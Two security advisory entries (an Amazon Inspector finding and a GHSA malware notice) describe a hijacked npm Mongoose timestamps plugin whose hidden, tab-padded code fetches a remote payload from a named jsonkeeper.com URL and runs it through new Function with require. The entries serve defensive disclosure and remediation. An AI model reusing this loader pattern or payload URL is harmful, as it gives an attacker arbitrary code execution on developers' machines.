## Source: amazon-inspector (10d9262bdff06cb91509d2cc58964ae249c97f6e94bc790b42b637b015251adf)
index.js appends a hidden IIFE after `module.exports = leanhooksPlugin;`, padded with hundreds of tab characters to keep it off-screen in casual review. When any consumer require()s the package, the IIFE runs `axios.get('https://jsonkeeper.com/b/LZCY3')` and passes the returned `cookie` field to `new Function('require',...)`, then invokes the constructed function with the host's `require`. This gives the operator arbitrary code execution in the consumer's Node process with access to `require` (filesystem, network, environment variables). The advertised purpose is a small Mongoose timestamps plugin, but 0.5.5 also adds runtime dependencies (axios, sqlite3, request, defaults) that the plugin logic does not use — axios is present specifically to power the remote-exec loader. The payload host (jsonkeeper.com) is an anonymous, author-mutable paste service, so today's fetched code can be swapped for anything at any time without a package republish. Behavior shape is consistent with a hijack/malicious republish of a legacy package name.

## Source: ghsa-malware (51f21ca8cb459221a26134e631f974e5a26cb292386a957c75da31b538119c61)
Any computer that has this package installed or running should be considered fully compromised. All secrets and keys stored on that computer should be rotated immediately from a different computer. The package should be removed, but as full control of the computer may have been given to an outside entity, there is no guarantee that removing the package will remove all malicious software resulting from installing it.

cwes.description: The product contains code that appears to be malicious in nature.
